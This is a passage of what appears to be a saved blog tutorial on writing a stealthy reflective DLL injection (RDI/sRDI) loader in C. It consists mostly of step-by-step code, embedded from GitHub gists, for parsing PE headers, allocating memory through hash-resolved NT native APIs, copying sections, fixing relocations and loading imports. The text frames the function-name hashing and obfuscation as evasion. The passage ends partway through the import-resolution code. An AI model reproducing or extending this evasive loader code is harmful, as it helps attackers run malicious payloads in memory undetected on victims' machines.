<!--kg-card-end: html--><p>The above code is the equivalent code to <em>step 1</em> in our basic loader. &nbsp;This version includes Native API functions using function obfuscation and function name hashing. &nbsp;You can see the code went from 4 lines, to almost 40, and this doesn't count the structures and definitions we added.</p><hr><p></p><h3 id="stealth-step-2">Stealth Step 2</h3><p>The PE header of the DLL file is parsed to extract important information...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/372f2d1a02f4e5a14e102856238f7f91.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801195" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_1-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_1.c">
        <tbody><tr>
          <td id="file-stealth_step_1-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_1-c-LC1" class="blob-code blob-code-inner js-file-line">PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_1-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_1-c-LC2" class="blob-code blob-code-inner js-file-line">PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_bytes + dos_header-&gt;e_lfanew);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_1-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_1-c-LC3" class="blob-code blob-code-inner js-file-line">SIZE_T dll_image_size = nt_headers-&gt;OptionalHeader.SizeOfImage;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/372f2d1a02f4e5a14e102856238f7f91/raw/3337a5c94f031b4a497c1e3d5546679ecf727dd6/stealth_step_1.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/372f2d1a02f4e5a14e102856238f7f91#file-stealth_step_1-c">
          stealth_step_1.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><p>This code uses the <code>PIMAGE_DOS_HEADER</code> and <code>PIMAGE_NT_HEADERS</code> structures to find the size of the DLL file.</p><hr><p></p><h3 id="stealth-step-3">Stealth Step 3</h3><p>Memory is allocated in the address space of the target process to hold the binary...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/f72a96b94541d2a86962b96951496548.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801337" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_2-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_2.c">
        <tbody><tr>
          <td id="file-stealth_step_2-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_2-c-LC1" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *dll_base = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_2-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">if</span>((status = g_nt_allocate_virtual_memory(((HANDLE) -<span class="pl-c1">1</span>), &amp;dll_base, <span class="pl-c1">0</span>, &amp;dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_2-c-LC3" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> -<span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_2-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_2-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> delta_image_base = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base - (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)nt_headers-&gt;OptionalHeader.ImageBase;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_2-c-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-en">memcpy</span>(dll_base, dll_bytes, nt_headers-&gt;OptionalHeader.SizeOfHeaders);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_2-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_2-c-LC8" class="blob-code blob-code-inner js-file-line">PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_2-c-LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-k">for</span>(<span class="pl-c1">size_t</span> i = <span class="pl-c1">0</span>; i &lt; nt_headers-&gt;FileHeader.NumberOfSections; i++) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_2-c-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *section_destination = (LPVOID)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)section-&gt;<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-stealth_step_2-c-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *section_bytes = (LPVOID)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_bytes + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)section-&gt;<span class="pl-smi">PointerToRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-stealth_step_2-c-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(section_destination, section_bytes, section-&gt;<span class="pl-smi">SizeOfRawData</span>);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-stealth_step_2-c-LC13" class="blob-code blob-code-inner js-file-line">    section++;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_2-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-stealth_step_2-c-LC14" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/f72a96b94541d2a86962b96951496548/raw/83b0aff61cb6456c2a3c12889976e606f558bcbf/stealth_step_2.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/f72a96b94541d2a86962b96951496548#file-stealth_step_2-c">
          stealth_step_2.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>The above code allocates virtual memory for a DLL and copies the DLL's header into the allocated memory, and then iterates through each section of the DLL, copying their contents into the allocated memory. The code calculates the difference between the base address of the allocated memory and the <code>ImageBase</code> address in the DLL's PE file header, and uses <code>memcpy()</code> for memory copying operations. Next the code iterates through the sections of a DLL, as defined in its PE file header.</p><!--kg-card-end: html--><hr><p></p><h3 id="stealth-step-4">Stealth Step 4</h3><p>The loader performs any necessary relocation fixups on the executable. Relocation...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/8307858f1f7eb6678bfbc35700150448.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801538" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_4-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_4.c">
        <tbody><tr>
          <td id="file-stealth_step_4-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_4-c-LC1" class="blob-code blob-code-inner js-file-line">IMAGE_DATA_DIRECTORY relocations = nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_4-c-LC2" class="blob-code blob-code-inner js-file-line"><span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> relocation_table = relocations.VirtualAddress + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_4-c-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">unsigned</span> <span class="pl-k">long</span> relocations_processed = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_4-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_4-c-LC5" class="blob-code blob-code-inner js-file-line"><span class="pl-k">while</span>(relocations_processed &lt; relocations.<span class="pl-c1">Size</span>) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_4-c-LC6" class="blob-code blob-code-inner js-file-line">    PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_4-c-LC7" class="blob-code blob-code-inner js-file-line">    relocations_processed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_4-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> relocations_count = (relocation_block-&gt;<span class="pl-smi">BlockSize</span> - <span class="pl-k">sizeof</span>(BASE_RELOCATION_BLOCK)) / <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_4-c-LC9" class="blob-code blob-code-inner js-file-line">    PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_4-c-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-stealth_step_4-c-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> i = <span class="pl-c1">0</span>; i &lt; relocations_count; i++) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-stealth_step_4-c-LC12" class="blob-code blob-code-inner js-file-line">        relocations_processed += <span class="pl-k">sizeof</span>(BASE_RELOCATION_ENTRY);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-stealth_step_4-c-LC13" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(relocation_entries[i].<span class="pl-smi">Type</span> == <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-stealth_step_4-c-LC14" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">continue</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-stealth_step_4-c-LC15" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-stealth_step_4-c-LC16" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> relocation_rva = relocation_block-&gt;<span class="pl-smi">PageAddress</span> + relocation_entries[i].<span class="pl-smi">Offset</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-stealth_step_4-c-LC17" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span> address_to_patch = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-stealth_step_4-c-LC18" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *p_nt_read_virtual_memory = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, NtReadVirtualMemory_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-stealth_step_4-c-LC19" class="blob-code blob-code-inner js-file-line">        NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t) p_nt_read_virtual_memory;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-stealth_step_4-c-LC20" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>((status = <span class="pl-c1">g_nt_read_virtual_memory</span>(((HANDLE) -<span class="pl-c1">1</span>), (<span class="pl-k">void</span> *)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + relocation_rva), &amp;address_to_patch, <span class="pl-k">sizeof</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>), <span class="pl-c1">NULL</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-stealth_step_4-c-LC21" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> -<span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-stealth_step_4-c-LC22" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-stealth_step_4-c-LC23" class="blob-code blob-code-inner js-file-line">        address_to_patch += delta_image_base;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-stealth_step_4-c-LC24" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)((<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base + relocation_rva), &amp;address_to_patch, <span class="pl-k">sizeof</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>));</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-stealth_step_4-c-LC25" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-stealth_step_4-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-stealth_step_4-c-LC26" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/8307858f1f7eb6678bfbc35700150448/raw/d5b79c3c52c3f3b255b756175a8985ed3bea828c/stealth_step_4.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/8307858f1f7eb6678bfbc35700150448#file-stealth_step_4-c">
          stealth_step_4.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><p>This code is responsible for performing relocation of the DLL image to its new base address. It first gets the relocation data directory and calculates the relocation table's RVA. It then iterates over each block in the relocation table and calculates the address to patch based on the relocation type and offset by using both the <code>PBASE_RELOCATION_ENTRY</code> and <code>PBASE_RELOCATION_BLOCK</code> structures. It reads the original value at the address to patch, adds the delta image base to it, and writes it back to the same location to update the address to the new location. This process ensures that the DLL can run correctly at its new base address.</p><hr><p></p><h3 id="stealth-step-5">Stealth Step 5</h3><p>The loader performs any necessary imports. An import is a reference to a function...</p><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/7ba7b2060f33c0edf72c8cc6b15c37b0.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121801612" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-stealth_step_5-c" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="stealth_step_5.c">
        <tbody><tr>
          <td id="file-stealth_step_5-c-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-stealth_step_5-c-LC1" class="blob-code blob-code-inner js-file-line">PIMAGE_IMPORT_DESCRIPTOR import_descriptor;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-stealth_step_5-c-LC2" class="blob-code blob-code-inner js-file-line">IMAGE_DATA_DIRECTORY images_directory = nt_headers-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-stealth_step_5-c-LC3" class="blob-code blob-code-inner js-file-line">UNICODE_STRING import_library_name;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-stealth_step_5-c-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-stealth_step_5-c-LC5" class="blob-code blob-code-inner js-file-line">import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (<span class="pl-k">unsigned</span> <span class="pl-k">long</span> <span class="pl-k">long</span> <span class="pl-k">int</span>)dll_base);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-stealth_step_5-c-LC6" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *current_library = <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-stealth_step_5-c-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-stealth_step_5-c-LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-k">while</span>(import_descriptor-&gt;Name != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-stealth_step_5-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_ldr_load_dll = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, LdrLoadDll_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-stealth_step_5-c-LC10" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> *module_name = (<span class="pl-k">char</span> *)dll_base + import_descriptor-&gt;<span class="pl-smi">Name</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-stealth_step_5-c-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">wchar_t</span> w_module_name[MAX_PATH];</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-stealth_step_5-c-LC12" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> num_converted;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-stealth_step_5-c-LC13" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-stealth_step_5-c-LC14" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *p_rtl_multi_byte_to_unicode_n = <span class="pl-c1">get_proc_address_by_hash</span>(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-stealth_step_5-c-LC15" class="blob-code blob-code-inner js-file-line">    RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t) p_rtl_multi_byte_to_unicode_n;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-stealth_step_5-c-LC16" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_rtl_multi_byte_to_unicode_n</span>(w_module_name, <span class="pl-k">sizeof</span>(w_module_name), &amp;num_converted, module_name, <span class="pl-c1">sl</span>(module_name) +<span class="pl-c1">1</span>)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-stealth_step_5-c-LC17" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">5</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-stealth_step_5-c-LC18" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-stealth_step_5-c-LC19" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">g_rtl_init_unicode_string</span>(&amp;import_library_name, w_module_name);</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-stealth_step_5-c-LC20" class="blob-code blob-code-inner js-file-line">    LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t) p_ldr_load_dll;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-stealth_step_5-c-LC21" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>((status = <span class="pl-c1">g_ldr_load_dll</span>(<span class="pl-c1">NULL</span>, <span class="pl-c1">NULL</span>, &amp;import_library_name, &amp;current_library)) != <span class="pl-c1">0x0</span>)</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-stealth_step_5-c-LC22" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> -<span class="pl-c1">6</span>;</td>
        </tr>
        <tr>
          <td id="file-stealth_step_5-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
